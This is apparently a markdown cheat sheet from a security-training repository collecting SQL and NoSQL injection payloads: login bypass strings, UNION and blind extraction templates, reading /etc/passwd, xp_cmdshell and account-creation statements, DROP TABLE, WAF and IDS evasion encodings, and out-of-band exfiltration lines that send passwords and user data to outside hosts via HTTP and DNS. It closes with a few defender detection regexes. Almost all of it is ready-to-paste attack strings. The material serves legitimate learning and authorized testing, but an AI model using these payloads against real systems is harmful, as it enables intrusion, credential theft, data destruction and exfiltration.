# SQL Injection Payloads Cheat Sheet

A single, copy-paste-ready reference of every payload and testing string covered in this repository. Cross-references
point back to the topic file with full context for each entry.

> ⚠️ Authorized testing only. See the repo [README](../README.md) for scope.

---

## 1. Standard SQL Injection Testing Strings (Table 15.2)

The classic "cheat sheet" of testing strings used to probe for SQLi vulnerability. Full context:
[03 — Methodology: Information Gathering](../03-methodology-information-gathering.md).

```
||6
'||'6
(||6)
' OR 1=1--
OR 1=1
' OR '1'='1
; OR '1'='1'
%27+--+
" or 1=1--
' or 1=1 /*

or 1=1--
" or "a"="a
Admin' OR '
' having 1=1--
' OR 'text' = N'text'
' OR 2 > 1
' OR 'text' > 't'
' union select
Password:*/=1--
' or 1/*

%22+or+isnull%281%2F0%29+%2F*
' group by userid having 1=1--
'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
CRATE USER name IDENTIFIED BY 'pass123'
' union select 1,load_file('/etc/passwd'),1,1,1;
'; exec master..xp_cmdshell 'ping 10.10.1.2'--
exec sp_addsrvrolemember 'name','sysadmin'
GRANT CONNECT TO name; GRANT RESOURCE TO name;
' union select * from users where login = char(114,111,111,116);

'/**/OR/**/1/**/=/**/1
' or 1 in (select @@version)--
' union all select @@version--
' OR 'unusual' = 'unusual'
' OR 'something' = 'some'+'thing'
' OR 'something' like 'some%'
' OR 'whatever' in ('whatever')
' OR 2 BETWEEN 1 and 3
' or username like char(37);

UNI/**/ON SEL/**/ECT
'; EXEC ('SEL' + 'ECT US' + 'ER')
+or+isnull%281%2F0%29+%2F*
%27+OR+%277659%27%3D%277659
%22+or+isnull%281%2F0%29+%2F*
' and 1 in (select var from temp)--
'; drop table temp --
exec sp_addlogin 'name','password'
@var select @var as var into temp end --
```

## 2. Function Testing Strings

Context: [03 — Methodology: Information Gathering](../03-methodology-information-gathering.md).

```
?parameter=123
?parameter=1'
?parameter=1'#
?parameter=1"
?parameter=1 AND 1=1--
?parameter=1'-
?parameter=1 AND 1=2--
?parameter=1'/*
?parameter=1' AND '1'='1
?parameter=1 order by 1000
```

## 3. Login-Form Authentication Bypass

Context: [05 — Advanced SQL Injection](../05-methodology-advanced-sql-injection.md).

```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
1'or'1'='1
" or 0=0 --
or 0=0 --
' or 0=0 #
" or 0=0 #
or 0=0 #
' or 'x'='x
" or "x"="x
```

**Log in as a different, known user:**
```sql
' UNION SELECT 1,'anotheruser','doesnt matter', 1--
```

**Bypass an MD5 hash check:**
```
Username: admin
Password: 1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055
```
(`81dc9bdb52d04dc20036dbd8313ed055` = `MD5('1234')`)

## 4. Blind SQLi — Boolean & Time-Based Extraction Templates

Context: [04 — Launching Attacks](../04-methodology-launching-attacks.md).

```sql
-- Boolean: force FALSE / TRUE
?id=67 and 1=2
?id=67 and 1=1

-- Time-based (MSSQL)
; IF EXISTS(SELECT * FROM creditcard) WAITFOR DELAY '0:0:10'--
IF (LEN(<subquery>)=N) WAITFOR DELAY '00:00:10'--
IF(ASCII(lower(substring((<subquery>),position,1)))=asciiVal) WAITFOR DELAY '00:00:10'--

-- Time-based (MySQL)
BENCHMARK(howmanytimes, do_this)

-- Heavy query (no time-delay functions needed)
1 AND 1 < SELECT count(*) FROM all_users A, all_users B, all_users C

-- Double-blind (benchmark/sleep-based)
/?id=1+AND+if((ascii(lower(substring((select password from user limit 0,1),0,1))))=97,1,benchmark(2000000,md5(now())))
```

## 5. Regex/Binary-Search Character Extraction

Context: [04 — Launching Attacks](../04-methodology-launching-attacks.md).

```sql
-- MySQL REGEXP binary search
SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-f]' AND ID=2
SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-c]' AND ID=2
SELECT 1 FROM UserInfo WHERE Password REGEXP '^[d-f]' AND ID=2
SELECT 1 FROM UserInfo WHERE Password REGEXP '^[d]' AND ID=2

-- MSSQL LIKE binary search
SELECT 1 FROM UserInfo WHERE Password LIKE 'd[a-f]%' AND ID=2
SELECT 1 FROM UserInfo WHERE Password LIKE 'd[0-9]%' AND ID=2
SELECT 1 FROM UserInfo WHERE Password LIKE 'd[8]%' AND ID=2
```

## 6. Out-of-Band Exfiltration

Context: [04](../04-methodology-launching-attacks.md) and [05](../05-methodology-advanced-sql-injection.md).

```sql
-- Oracle HTTP callback
http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80')||(SELECT user FROM DUAL)-

-- DNS exfiltration
do_dns_lookup((select top 1 password from users) + '.certifiedhacker.com');

-- MSSQL DNS exfil via xp_dirtree
DECLARE @hostname varchar(1024);
SELECT @hostname=(SELECT HOST_NAME())+'.appserver.example.com;
EXEC('master.dbo.xp_dirtree "\\'+@hostname+'\c$"');
```

## 7. WAF/Firewall Bypass Payloads

Context: [05 — Advanced SQL Injection](../05-methodology-advanced-sql-injection.md).

```sql
-- Normalization
/?id=1/*union*/union/*select*/select+1,2,3/*

-- HPP
/?id=1;select+1&id=2,3+from+users+where+id=1--

-- HPF
/?a=1+union/*&b=*/select+1,2
/?a=1+union/*&b=*/select+1,pass/*&c=*/ from+users--

-- Blind (WAF signature synonyms)
/?id=1+OR+0x50=0x50
/?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74

-- Signature bypass
/?id=1+union+(select+'xz'from+xxx)
/?id=(1)union(select(1),mid(hash,1,32)from(users))
/?id=1+union+(select'1',concat(login,hash)from+users)
/?id=(1)union((((((select(1),hex(hash)from(users))))))))
/?id=xx(1)or(0x50=0x50)

-- Buffer overflow probe
?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4...

-- CRLF
http://www.certifiedhacker.com/info.php?id=1+%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5--

-- JSON-based (smuggle past character filters)
{"user": "<username>' --","pass": "irrelevant"}
```

## 8. NoSQL / MongoDB Injection

Context: [05 — Advanced SQL Injection](../05-methodology-advanced-sql-injection.md).

```
User_name[$eq]=admin&pwd[$ne]=admin
```

```javascript
// $where JS injection — dump all users
'; return '' == '

// $where JS injection — DoS
while(true) { }
```

## 9. IDS/WAF Evasion Payloads

Full context and explanation for each of these: [07 — IDS/WAF Evasion Techniques](../07-ids-waf-evasion-techniques.md).

```sql
-- In-line comment
'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/username/**/LIKE/**/'admin'--

-- Char encoding
' union select 1,(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
' or username like char(37);
' union select * from users where login = char(114,111,111,116);

-- String concatenation
'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'          -- Oracle
'; EXEC ('DRO' + 'P T' + 'AB' + 'LE')                    -- MSSQL
'; EXECUTE CONCAT('INSE','RT US','ER')                   -- MySQL

-- Whitespace manipulation
'OR'1'='1'

-- Hex encoding
; declare @x varchar(80); set @x = X73656c656374204040766573273696f6e; EXEC (@x)

-- Sophisticated matches
' OR 'john' = 'john'
' OR 'john' = N'john'

-- URL encoding
%27%20UNION%20SELECT%20Password%20FROM%20Users_Data%20WHERE%20name%3D%27Admin%27%E2%80%94

-- Double-URL encoding
%2527%2520UNION%2520SELECT%2520Password%2520FROM%2520Users_Data%2520WHERE%2520name%253D%2527Admin%2527%25E2%2580%2594

-- Null byte
%00' UNION SELECT Password FROM Users WHERE UserName='admin'--

-- Case variation
UnIoN sEleCt UsEr_iD, PaSSwOrd fROm aDmiN wHeRe UseR_NamE='AdMIn'--

-- Declare variables
; declare @sqlvar nvarchar(70); set @sqlvar = (N'UNI' + N'ON' + N' SELECT' + N'Password'); EXEC(@sqlvar)

-- Variation (equivalent TRUE expressions)
OR 1=1 --
OR 2=2 --
OR 1+1=2 --
OR "evade"="ev"+"ade" --
```

## 10. Detection Regexes (Defender Side)

Full context: [09 — SQL Injection Detection Tools](../09-sql-injection-detection-tools.md).

```regex
/(\')|(\%27)|(\-\-)|(#)|(\%23)/ix
/((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))/ix
/\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/ix
/((\%27)|(\'))union/ix
/exec(\s|\+)+(s|x)p\w+/ix
/User-Agent\x3A\x20[^\r\n]*sleep\x28/i
/[?&]selInfoKey1=[^&]*?([\x27\x22\x3b\x23]|\x2f\x2a|\x2d\x2d)/i
```

---

**See also:** [`commands-and-tools-cheatsheet.md`](commands-and-tools-cheatsheet.md) for tool invocations and
per-DBMS administrative syntax.
